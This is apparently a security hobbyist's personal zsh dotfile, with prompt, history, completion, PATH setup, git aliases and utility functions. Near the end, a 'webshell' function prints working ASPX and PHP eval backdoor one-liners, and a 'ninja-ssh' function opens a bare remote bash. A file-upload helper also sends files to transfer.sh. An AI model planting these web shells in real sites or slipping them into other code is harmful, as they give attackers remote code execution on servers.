bindkey "^[[1~" beginning-of-line
bindkey "^[[4~" end-of-line
bindkey "^[[H" beginning-of-line
bindkey "^[[F" end-of-line

setopt prompt_subst # enable command substition in prompt
autoload -Uz vcs_info

function +vi-git_status {
  # Check for untracked files or updated submodules since vcs_info does not.
  if [[ -n $(git ls-files --other --exclude-standard 2> /dev/null) ]]; then
    hook_com[unstaged]='%F{red}✗%f'
  fi
}
zstyle ':vcs_info:*' enable bzr git hg svn
zstyle ':vcs_info:*' check-for-changes true
zstyle ':vcs_info:*' stagedstr '%F{green}✓%f'
zstyle ':vcs_info:*' unstagedstr '%F{yellow}•%f'
zstyle ':vcs_info:*' formats '  %b%c%u'
zstyle ':vcs_info:*' actionformats " - [%b%c%u|%F{cyan}%a%f]"
zstyle ':vcs_info:(sv[nk]|bzr):*' branchformat '%b|%F{cyan}%r%f'
zstyle ':vcs_info:git*+set-message:*' hooks git_status
zstyle ':completion:*' use-ip true

ASYNC_PROC=0
ASYNC_DATA="${TMPPREFIX}-prompt_sorin_data"
function precmd() {

    function async() {
        vcs_info
        # save to temp file
        printf "%s" "${vcs_info_msg_0_}" > $ASYNC_DATA
        # signal parent
        kill -s USR1 $$
    }
    # do not clear RPROMPT, let it persist
    # kill child if necessary
    if [[ "${ASYNC_PROC}" != 0 ]]; then
        kill -s HUP $ASYNC_PROC >/dev/null 2>&1 || :
    fi
    # start background computation
    async &!
    ASYNC_PROC=$!
}

unsetopt BG_NICE

function TRAPUSR1() {
    # read from temp file
    RPROMPT="$(cat $ASYNC_DATA)"
    # reset proc number
    ASYNC_PROC=0
    # redisplay
    zle && zle reset-prompt
}

if [ `id -u` = 0 ]; then
    PROMPT='%F{red}%n@%m%f:%F{blue}%~%f# '
    #PROMPT='%F{1}%n@%m%f:%F{172}%~%f# '
    #PROMPT='%F{172}%~%f %F{1}»%f '
    RPROMPT=''
else
    PROMPT='%F{yellow}%n@%m%f:%F{cyan}%~%f$ '
    #PROMPT='%F{116}%n@%m%f:%F{114}%~%f$ '
    #PROMPT='%F{114}%~%f %F{116}»%f '
    RPROMPT=''
fi

# history
HISTFILE=$HOME/.zsh_history
export HISTSIZE=1000
export SAVEHIST=1000
setopt INC_APPEND_HISTORY #以附加方式寫入歷史紀錄
setopt HIST_IGNORE_DUPS #如果連續命令相同,只留一
limit coredumpsize 0 #core dump

# completion
autoload -U compinit
compinit
setopt correct #自動校正
zstyle ':completion:*' matcher-list '' 'm:{a-zA-Z}={A-Za-z}'  #大小寫修正
zstyle ':completion:*:*:*:*:*' menu select  #開啟補齊select顏色

#autojump
[[ -s /usr/share/autojump/autojump.sh ]] && source /usr/share/autojump/autojump.sh
#autoload -U compinit && compinit -u

#Colors
export TERM=xterm-256color
# Define colors for BSD ls.
export LSCOLORS='exfxcxdxbxGxDxabagacad'
# Define colors for the completion system.
export LS_COLORS='di=34:ln=35:so=32:pi=33:ex=31:bd=36;01:cd=33;01:su=31;40;07:sg=36;40;07:tw=32;40;07:ow=33;40;07:'
zstyle ':completion:*:default' list-colors ${(s.:.)LS_COLORS}

export LANGUAGE="en_US.UTF-8"
export LANG="en_US.UTF-8"
export LC_ALL="en_US.UTF-8"

# Setup PATH
export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$HOME/.dotfiles/tools"
if [ `uname` = "Darwin" ]; then
    export PATH="/usr/local/opt/python@2/libexec/bin:$PATH"
fi

if uname | grep -q 'MINGW64'; then
    export PATH="/c/msys64/mingw64/bin:$PATH"
fi

if [ -d  ~/go ]; then
    export PATH="$HOME/go/bin:$PATH"
fi

if [ -d /usr/local/opt/openjdk/bin ]; then
    export PATH="/usr/local/opt/openjdk/bin:$PATH"
fi



if ls --color -d . &>/dev/null 2>&1
then
    # Linux Style
    alias ls='ls --color=tty'
else
    # BSD Style
    alias ls='ls -G'
fi

alias vi='vim --noplugin'
alias ll='ls -la'
alias grep='grep --color'

alias -s rm='rm -i'
alias -s gz='tar -xzvf'
alias -s tgz='tar -xzvf'
alias -s bz2='tar -xjvf'
alias -s jar='java -jar'

alias grep='grep --color'
alias -g G='| grep --color'
alias -g L='| less'
alias -g H='| head'
alias -g T='| tail'
alias -g S='| sort'

alias ptt='ssh bbsu@ptt.cc'

alias git_current_branch='git rev-parse --abbrev-ref HEAD'
alias g='git'
alias gd='git diff'
alias ga='git add'
alias gcm='git commit --message'
alias gp='git push'
alias gl='git pull'
alias gpc='git push --set-upstream origin "$(git_current_branch 2> /dev/null)"'
alias gpp='git pull origin "$(git_current_branch 2> /dev/null)" && git push origin "$(git_current_branch 2> /dev/null)"'
alias gc='git checkout'
alias gb='git branch'
alias gs='git status'

if [ `uname` = "Darwin" ]; then
    alias php70='brew link php70'
    alias php55='brew link php55'
    alias php56='brew link php56'
    alias brewup='brew upgrade && brew cleanup'
    export PATH="/usr/local/sbin:$PATH"
    export PATH="$PATH:$HOME/.local/bin"
fi

alias pys='python3 -m http.server'
alias phps='php -S 0.0.0.0:9000'

if [ -d ~/.ctf-tools ]; then
    source ~/.ctf-tools/pwn
fi

. $HOME/.dotfiles/tools/z.sh

alias nc='netcat'
alias shutdown='shutdown -h now'
alias reboot='shutdown -r now'
alias freemem='echo 1 > /proc/sys/vm/drop_caches'


function ip(){
    echo "[+] mullvad:"
    curl -s https://am.i.mullvad.net/ip
    echo "\n[+] ip-api:"
    curl -s http://ip-api.com/json/ | jq -r '.query,.country,.regionName'
}

function x(){
    chmod +x $1
}

function killport(){
    kill -9 `lsof -t -i:$1`
}

function ninja-ssh(){
    ssh -l$1 $2 /usr/bin/bash
}

#Docker
function da(){
    docker exec -it $1 zsh
}

function docker-cleanup(){
    docker rmi $(docker images -f "dangling=true" -q)
}


function webshell(){
    echo "aspx : <%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"pass\"],\"unsafe\");%>"
    echo "php : <?php @eval(\$_POST['pass']);?>"
}

#transfer.sh
transfer(){ if [ $# -eq 0 ];then echo "No arguments specified.\nUsage:\n transfer <file|directory>\n ... | transfer <file_name>">&2;return 1;fi;if tty -s;then file="$1";file_name=$(basename "$file");if [ ! -e "$file" ];then echo "$file: No such file or directory">&2;return 1;fi;if [ -d "$file" ];then file_name="$file_name.zip" ,;(cd "$file"&&zip -r -q - .)|curl --progress-bar --upload-file "-" "https://transfer.sh/$file_name"|tee /dev/null,;else cat "$file"|curl --progress-bar --upload-file "-" "https://transfer.sh/$file_name"|tee /dev/null;fi;else file_name=$1;curl --progress-bar --upload-file "-" "https://transfer.sh/$file_name"|tee /dev/null;fi;}
